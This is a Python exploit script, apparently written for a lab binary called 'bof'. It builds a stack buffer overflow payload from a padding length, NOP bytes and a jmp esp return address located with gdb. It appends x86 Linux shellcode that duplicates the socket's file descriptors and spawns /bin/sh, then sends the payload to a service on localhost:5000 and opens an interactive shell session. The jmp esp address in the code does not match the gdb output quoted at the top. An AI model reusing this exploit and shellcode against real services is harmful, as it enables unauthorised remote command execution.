# exploit.py
import sys,struct,socket,telnetlib,binascii
#from subprocess import Popen

"""
gdb -q -x bof.gdb bof
--- find/b a,b,jmpesp ---
0x8048430 <main+13>
0x8049430
2 patterns found.
--- find/b a,b,callesp ---
0x8048432 <main+15>
0x8049432
2 patterns found.
--- find/b a,b,pushespret ---
0x8048439 <main+22>
0x8049439
2 patterns found.
"""

bufsize = int(sys.argv[1])

#shellcode = '\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
shellcode = ""
shellcode+="\x31\xc0"
shellcode+="\x99"
shellcode+="\x6a\x04"
shellcode+="\x5b"
shellcode+="\x6a\x02"
shellcode+="\x59"
shellcode+="\xb0\x3f"
shellcode+="\xcd\x80"
shellcode+="\x49"
shellcode+="\x79\xf9"
shellcode+="\x31\xc0"
shellcode+="\x50"
shellcode+="\x68\x2f\x2f\x73\x68"
shellcode+="\x68\x2f\x62\x69\x6e"
shellcode+="\x89\xe3"
shellcode+="\x50"
shellcode+="\x89\xe2"
shellcode+="\x53"
shellcode+="\x89\xe1"
shellcode+="\xb0\x0b"
shellcode+="\xcd\x80"

addr_jmpesp = 0x80483f2    # (gdb) find/b 0x08048000,0x0804b000-1,0xff,0xe4
addr_callesp = 0x8048432     # (gdb) find/b 0x08048000,0x0804b000-1,0xff,0xd4
addr_pushespret = 0x8049439  # (gdb) find/b 0x08048000,0x0804b000-1,0x54,0xc3

buf = 'A' * bufsize
buf += '\x90' * 24
buf += struct.pack('<I', addr_jmpesp) 
buf += shellcode
print binascii.hexlify(buf)
#p = Popen(['./bof', buf])
#p.wait()
s = socket.create_connection(('localhost', 5000))
#print s.recv(1024)
s.sendall(buf+"\n")
t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()

